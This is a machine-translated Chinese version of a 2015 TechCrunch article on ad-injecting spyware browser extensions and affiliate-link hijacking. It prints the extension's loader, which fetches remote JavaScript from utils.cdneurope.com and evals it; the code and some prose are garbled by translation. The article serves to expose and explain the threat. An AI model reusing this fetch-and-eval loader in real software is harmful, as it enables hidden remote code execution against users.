# 点击劫持犯:了解现代间谍软件的陌生新世界 

> 原文：<https://web.archive.org/web/https://techcrunch.com/2015/04/19/clickjackers-inside-the-strange-new-world-of-modern-spyware/>

如果你在 2014 年幸运地，或者，事实上，不幸地从一个叫做 WeLikeTheWeb.com 的网站下载了 Chrome 和 Firefox 的扩展，你看到的只是一个网站推荐引擎，你可能会忽略或卸载它。从表面上看，这个应用程序是无害的。但是，如果你让它运行，你会碰到一个迷人的软件，它指出了一个间谍软件的新时代，以新的和邪恶的方式使用你的计算机，甚至有时是风险投资资助的 T2。
￼

从表面上看，这个扩展(根据大多数病毒扫描程序，它目前被解读为恶意软件，实际上已经死亡)会在你浏览时弹出窗口。然而，如果你是一个代销商——本质上是一个网站创建者，通过将客户送到 booking.com 或 brazzers.com 这样的页面来赚钱——你会发现 WeLikeTheWeb 的网站推荐插件有很多令人讨厌的地方。它是一个广告注入器，一个引导用户远离“合法”广告并将图像和 HTML 注入你的浏览体验的工具。谷歌估计有 5%的网络用户在不知情的情况下使用广告注入器，这让营销人员抓狂——这产生了一些有趣的代码。

# 在后台

从表面上看，这个插件非常普通。你可以[看看这里的代码](https://web.archive.org/web/20221007091050/http://lts.cr/c/Ni3a)。它看起来像广告宣传的那样通过在你浏览时提出建议来工作，但是当你进一步挖掘应用程序时，你会发现一些有趣的事情。除了一句让世界充满伤害的话。

看一下这段代码:

`var website_rec = new function() {
// consts
this.REMOTE_URL = "http://utils.cdneurope.com/js/link-ff.js";`

//fields
this . Ajax request = null；

this . init = function(){
try {
this . Ajax request = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].create instance(components . interfaces . nsixmlhttprequest)；
this.ajaxRequest.open('GET '，this。REMOTE_URL，true)；
this . Ajax request . setrequest header(' Cache-Control '，' no-Cache ')；
this . Ajax request . channel . load flags | = components . interfaces . NSI request . load _ BYPASS _ CACHE；

this . Ajax request . onreadystatechange = function(){
try {
if(this . ready state = = 4&&this . status = = 200){
eval(unescape(this . responsetext))；
}
}
} { }
}
this . Ajax request . send(null)；
} catch(ex) { }

this . init()；
}

重要的部分在顶部。你看，这个插件访问并运行一个隐藏在名为 utils.cdneurope.com 的网站上的文件。

cdeurope 是一块难啃的骨头——追踪它的地理来源是不可能的，因为你最远只能到达托管公司 XLHost.com 的——但它在几秒钟内就能提供恶意软件。域名注册商是隐藏的，发给该公司的电子邮件也没有得到回复。

这段代码可以做任何事情，对于普通用户来说，它所做的事情是不可见的。事实上，要弄清楚到底发生了什么是绝对困难的。

据 [VirusTotal](https://web.archive.org/web/20221007091050/https://www.virustotal.com/en/url/72daf5d52a1a52b4e2ada5980aaaa365c9600366bf25d7b40c9478fd3dfaa1ab/analysis/) 显示，该文件似乎是干净的。然而，这些代码显然是经过了模糊处理的:

![Screen Shot 2015-04-17 at 12.26.01 PM](img/81fa52895eedec26a5d4e07ecc253518.png)

这种加密系统——它实际上是一种减小文件大小和防止窥探 JavaScript 文件的方法——扩展成可读代码很简单。但是它有什么用呢？在这个 matryoshka 代码玩偶中，真正的活动被进一步混淆，只有在代码运行时才能访问功能。想象一辆车，当它以每小时 60 英里的速度行驶时，它的门只打开，让你进去。一旦你真的破解了它，你会发现一些非常有趣的事情。

这是一个赚钱的机会:

![Screen Shot 2015-04-17 at 12.38.24 PM](img/152455500a90c5fc96a5279c8bfb684e.png)

注意网址。在这种特殊情况下，该软件会动态改变附属链接——广告商嵌入其网站以赚点小钱的代码。举例来说，这种恶意软件不是通过点击 Booking.com 来获得积分，而是劫持链接并将积分发送到其他地方。如果用户点击 brazzers.com(NSFW)的链接，恶意软件就会介入，将广告费发给另一个用户。简而言之，chrome 扩展从日常的网络交易中获利，反过来，还赚了一大笔钱。

Packetsled 首席执行官马特·哈里根(Matt Harrigan)表示:“有一些非常有趣的事情正在发生，可能是为了避免谷歌在 Chrome 插件上的任何代码签名企图，这些插件旨在将用户重定向到广告网站。”“有趣的是，他们似乎很成功，而且这似乎不是 Chrome 独有的。在其他几个文件中有 Firefox 特有的代码，这些代码比初始脚本更加模糊。我们认为这可能会导致更广泛的问题，而不仅仅是简单的点击劫持。”

# 见见新老板，和以前的老板一样

WebSiteRecommendation 的大多数用户都是从一个种子下载程序 uTorrent 感染了恶意软件。即使是今天，在 WSR 似乎关闭商店一年后，uTorrent 有时仍会捆绑一些名为 [MyBrowserBar](https://web.archive.org/web/20221007091050/http://bittorrent.mybrowserbar.com/terms_mac.html) 的东西，最近因捆绑了一些[比特币挖矿膨胀软件](https://web.archive.org/web/20221007091050/https://hacked.com/utorrent-bundles-bloatware-epic-scale/)而受到抨击，这些软件后来被证明是一种非营利捐赠系统，利用空闲周期为慈善机构筹集资金。无论你如何称呼它——恶意软件、膨胀软件、间谍软件——这些软件以惊人的规律出现和消失，今天善意的慈善应用程序可能成为明天的劫客。

[Webroot](https://web.archive.org/web/20221007091050/https://beta.techcrunch.com/tag/Webroot) 的安全情报主管 Grayson Milbourne 说:“今天许多更先进的恶意软件都包含间谍软件功能，但我们也看到间谍软件与软件包一起分发。这些以所需应用程序的安装程序的形式出现，该安装程序已被包装在提供许多附加应用程序的新安装程序中。通常被称为 PUA(潜在的不需要的应用程序)这些应用程序通常提供优惠券或以某种方式与网络浏览器互动。这些程序包含非常广泛的 EULA，使他们能够以任何方式使用他们观察到的数据，通常是为了推动定向广告。”

并不是所有的间谍软件一开始都不好。许多应用一旦被不太谨慎的所有者收购，就会变得糟糕。当被合法所有者收购时，一些应用程序甚至转向光明的一面。

“这通常是间谍软件公司被更值得信赖的公司收购的结果，这些公司改变了他们的做法，”米尔本说。“当这种情况发生时，新公司将联系 AV 界，为他们正名。这一过程通常很难完成，因为有太多的反病毒软件存在，并且经常导致供应商的混合检测。”

专家认为间谍软件的高峰期发生在 2005 年，当时互联网还相当新。抓捕坏人的新技术使得驱动广告和窃取点击变得越来越难。

“自那以后，谷歌基本上或多或少地淘汰了‘间谍软件’。F-Secure 的安全顾问肖恩·沙利文说:“现在肯定不像以前了。“在 2006 年，有人会被引诱下载一个屏幕保护程序，在他们不知情的情况下，跟踪软件会被包含或安装在旁边。这些天来，这种跟踪软件是捆绑销售的(crapware ),这更像是一个买家当心的问题。在流行的用法中，间谍软件是指真正的间谍用来监视嫌疑人/目标的软件。许多我们过去称之为‘间谍软件’的东西通常被归类为风险软件/监控工具或可能不需要的软件。”

这些美其名曰 pua 的东西听起来无害，但它们仍然在造成真正的损害——只要问问无数用户就知道了，当联想在其笔记本电脑膨胀软件中包含 [Superfish](https://web.archive.org/web/20221007091050/http://www.extremetech.com/computing/200731-not-so-superfish-al-lenovo-still-shipping-infected-systems-as-customers-grapple-with-removal) 时，他们发现自己很容易受到攻击。现代操作系统在控制谁和什么管理你的信息方面变得越来越好，但仍然有大量的 0 天黑客可以窃取我们的时间、信息和金钱。

![clickjackers-mid](img/593113177d25844efd710164841c01b6.png)

间谍软件和 PUA 作家变得越来越聪明，我们的系统处于危险之中，每天都有新的工具被制造出来。而且有钱可赚。NSS 实验室的研究主任兰迪·艾布拉姆斯说，游说者正试图积极阻止反间谍法规，这显然是一个可怕的想法。

“间谍软件最终是由花在游说立法者上的钱来定义的，”艾布拉姆斯说。“广告/营销行业财力雄厚。肯定有营销组织不使用[间谍软件]，因为他们认为这些工具和做法跨越了法律界限。然而，对于游说国会的大多数行业组织来说，这种观点可能并不正确。

研究人员正在了解营销人员试图锁定我们的新方法，他们甚至很难给间谍软件重新命名，以反映其不断变化的性质。虽然我们许多人会称之为恶意软件，但研究人员每天都在发现新的间谍软件，它们对用户隐藏起来，但仍然是一种威胁。

F-Secure 的 Sullivan 说:“不小心使用他们安装的免费软件的人将继续受到伤害。”“有许多应用程序超越并威胁到隐私。一年多来，我一直在努力想一个新的标签。但‘间谍软件’似乎就是人们得到的东西。”